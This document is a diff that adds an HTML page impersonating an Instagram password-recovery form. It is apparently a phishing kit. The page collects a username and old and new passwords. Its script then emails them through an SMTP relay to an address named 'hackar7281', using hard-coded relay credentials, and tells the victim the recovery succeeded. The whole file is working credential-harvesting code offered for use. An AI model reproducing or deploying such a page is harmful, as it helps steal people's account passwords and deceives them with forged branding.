@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Instagram </title>
+    <link rel="shortcut icon" href="https://live.staticflickr.com/65535/53302079810_9bca05a783_m.jpg" type="image/png">
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- APP CSS -->
+    
+    
+    <style>
+    body {
+    background: linear-gradient(to right, #e2e2e2, #c9d6ff);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    height: 100vh;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    }
+    
+    
+    .form-content .logo img {
+    max-width: 100%;
+    }
+    
+    .logo-dark {
+    display: none;
+    }
+    
+    .dark .logo-dark {
+    display: block;
+    }
+    
+    .dark .logo-light {
+    display: none;
+    }
+    
+    
+    
+    form {
+    background-color: rgba(255, 255, 255, 0.8);
+    border-radius: 10px;
+    padding: 20px;
+    width: 300px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    
+    label {
+    font-size: 16px;
+    margin-bottom: 8px;
+    }
+    
+    input {
+    width: calc(100% - 16px);
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+    }
+    
+    input[type="button"] {
+    background-color: #512da8;
+    color: #fff;
+    cursor: pointer;
+    }
+    
+    input[type="reset"] {
+    background-color: #ccc;
+    color: #000;
+    cursor: pointer;
+    }
+    
+    input[type="password"] {
+    width: calc(100% - 32px);
+    display: inline-block;
+    }
+    
+    .toggle-password {
+    cursor: pointer;
+    position: relative;
+    top: -35px;
+    left: calc(100% - 50px);
+    }
+    
+    img {
+    width: 170px;
+    }
+    </style>
+    
+</head>
+
+<body>
+
+
+   <div class="form-container">
+   <div class="form-content box">
+   <div class="logo">
+   <img src="https://live.staticflickr.com/65535/53302079740_97a39f37ae_m.jpg" alt="Instagram logo" class="logo-light">
+   <img src="https://live.staticflickr.com/65535/53301600136_7c49ed177c_m.jpg" alt="Instagram logo" class="logo-dark">
+   </div>
+   </div>
+   </div>
+   
+   
+   <div class="container">
+    <h1></h1>
+
+    <div class="main">
+     <form action="">
+
+        <div class="form-input">
+             <label for="">Username</label><br>
+             <input type="text" placeholder="Username:" id="name">
+        </div>
+
+        <div class="form-input">
+            <label for="">Old Password</label><br>
+            <input type="text" placeholder="old password:" id="email">
+        </div>
+
+        <div class="form-input">
+            <label for="">New Password</label><br>
+            <input type="text" placeholder="New password" id="contact">
+        </div>
+
+        <div class="form-input">
+            <label for=""> Confirm Password</label><br>
+            <input type="text" placeholder="Confirm Password:" id="subject"> <br> <br>
+        </div>
+
+        <div class="form-input">
+            <button type="button" onclick="SendEmail()"> Submit </button>
+        </div>
+        
+     </form>
+     <div class="copyright">
+     © 2021 Instagram from Facebook Meta
+     </div>
+    </div>
+    <!-- end main class -->
+   </div>
+    <!--end Conatiner class  -->
+    
+    <script src="https://smtpjs.com/v3/smtp.js"> </script>
+
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    
+    <script>
+        function SendEmail(){
+          let name = document.getElementById("name").value;
+          let email = document.getElementById("email").value;
+          let conatact = document.getElementById("contact").value;
+          let subject = document.getElementById("subject").value;
+        
+          let body = "Name:" + name + "<br/> Email:" + email + "<br/> Contact Number:" + conatact + "<br/> Subject:" + subject;
+        
+        Email.send({
+        Host : "smtp.elasticemail.com",
+        Username : "hackar7281@gmail.com",
+        Password : "31FA737433E255C2F8831D39B1C546B7A34D",
+        To : 'hackar7281@telegmail.com',
+        From : "hackar7281@gmail.com",
+        Subject : subject,
+        Body: body
+        }).then(function(message) 
+        {
+        if (message === 'OK') 
+        {
+        swal("success!", "Your Instagram id recovery success", "success");
+        } else {
+        swal("Oops!", "Something went wrong. Please try again.", "error");
+        }
+        });
+        }
+    </script>
+
+ 
+</body>
+</html>
